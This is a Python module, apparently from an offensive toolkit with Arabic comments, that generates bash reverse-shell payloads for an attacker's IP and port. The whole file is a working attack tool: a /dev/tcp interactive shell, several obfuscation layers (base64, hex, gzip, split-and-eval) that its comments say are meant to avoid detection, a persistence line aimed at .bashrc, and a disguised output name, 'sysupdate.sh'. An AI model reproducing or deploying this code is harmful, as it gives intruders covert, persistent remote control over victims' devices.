# payloads/bash.py
import os
import random
import string
import base64

def random_comment():
    """توليد تعليق عشوائي"""
    words = ["DEBUG", "INFO", "FIXME", "TODO", "NOTE", "HACK", "TEST"]
    return "# " + random.choice(words) + ": " + ''.join(random.choices(string.ascii_letters, k=8))

def split_command(cmd, chunk_size=8):
    """تقسيم الأمر إلى أجزاء صغيرة ومتغيرات ثم إعادة تجميعه (لتجنب الاكتشاف)"""
    parts = [cmd[i:i+chunk_size] for i in range(0, len(cmd), chunk_size)]
    var_names = [''.join(random.choices(string.ascii_lowercase, k=4)) for _ in parts]
    code_lines = []
    for var, part in zip(var_names, parts):
        code_lines.append(f"{var}='{part}'")
    concat = ''.join([f"${v}" for v in var_names])
    code_lines.append(f"eval {concat}")
    return '\n'.join(code_lines)

def generate_manual(ip, port, obfuscation="0", stealth=False):
    # البايلود الأساسي العامل في Termux (تفاعلي)
    payload = f"exec 5<>/dev/tcp/{ip}/{port}; while read line 0<&5; do $line 2>&5 >&5; done"
    
    # مستويات التعتيم
    if obfuscation == "0":
        final = payload
    elif obfuscation == "1":  # Base64
        encoded = base64.b64encode(payload.encode()).decode()
        final = f"echo {encoded} | base64 -d | bash"
    elif obfuscation == "2":  # Base64 + Hex
        b64 = base64.b64encode(payload.encode()).decode()
        hexed = b64.encode().hex()
        final = f"echo {hexed} | xxd -r -p | base64 -d | bash"
    elif obfuscation == "3":  # gzip + Base64 (يتطلب gzip على الهدف)
        import gzip
        compressed = gzip.compress(payload.encode())
        b64_comp = base64.b64encode(compressed).decode()
        final = f"echo {b64_comp} | base64 -d | gzip -d | bash"
    elif obfuscation == "4":  # سوبر: تعليقات عشوائية + تقسيم الأمر
        comments = '\n'.join([random_comment() for _ in range(3)])
        split_cmd = split_command(payload)
        final = f"{comments}\n{split_cmd}"
    else:
        final = payload

    # إضافة استمرارية إذا طلب المستخدم stealth mode
    if stealth:
        # إضافة الأمر إلى .bashrc (تنبيه: قد يسبب تكرار الاتصال)
        pers = f'\n# Persistence\n[ -z "$SSH_CONNECTION" ] && ( {final} & ) >> /dev/null 2>&1\n'
        final += pers

    # حفظ الملف
    os.makedirs("output", exist_ok=True)
    filename = "payload_bash.sh"
    if stealth:
        filename = "sysupdate.sh"  # اسم مزيف
    with open(os.path.join("output", filename), "w") as f:
        f.write("#!/bin/bash\n")
        f.write(final)
    print(f"[+] Bash payload saved to output/{filename}")